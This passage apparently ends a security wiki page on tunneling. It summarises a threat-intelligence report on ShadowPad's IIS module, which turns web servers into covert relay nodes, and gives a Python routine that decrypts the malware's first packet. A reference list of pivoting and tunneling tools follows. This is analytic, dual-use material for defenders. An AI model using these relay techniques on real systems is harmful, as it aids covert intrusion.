Check Point describes ShadowPad's IIS module as turning compromised perimeter web servers into backdoor and relay nodes by binding URL prefixes through `HttpAddUrl`.<sup>[[3]](#references)</sup>

The same report details the defaults, wildcard listeners, packet decryption, relay queues, and debug telemetry summarized below.<sup>[[3]](#references)</sup>

* **Config defaults** – if the module’s JSON config omits values, it falls back to believable IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). That way benign traffic is answered by IIS with the correct branding.
* **Wildcard interception** – operators supply a semicolon-separated list of URL prefixes (wildcards in host + path). The module calls `HttpAddUrl` for each entry, so HTTP.sys routes matching requests to the malicious handler; nonmatching requests fall back to normal IIS behavior.
* **Encrypted first packet** – the first two bytes of the request body carry the seed for a custom 32-bit PRNG. Every subsequent byte is XOR-ed with the generated keystream before protocol parsing:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Relay orchestration** – the module maintains two lists: “servers” (upstream nodes) and “clients” (downstream implants). Entries are pruned if no heartbeat arrives within ~30 seconds. When both lists are non-empty, it pairs the first healthy server with the first healthy client and simply pipes bytes between their sockets until one side closes.
* **Debug telemetry** – optional logging records source IP, destination IP, and total forwarded bytes for each pairing. Investigators used those breadcrumbs to rebuild the ShadowPad mesh spanning multiple victims.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide: Bypass Firewall/IDS Restrictions](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting in Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domain Names - Implementation and Specification](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel overview](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)

{{#include ../banners/hacktricks-training.md}}
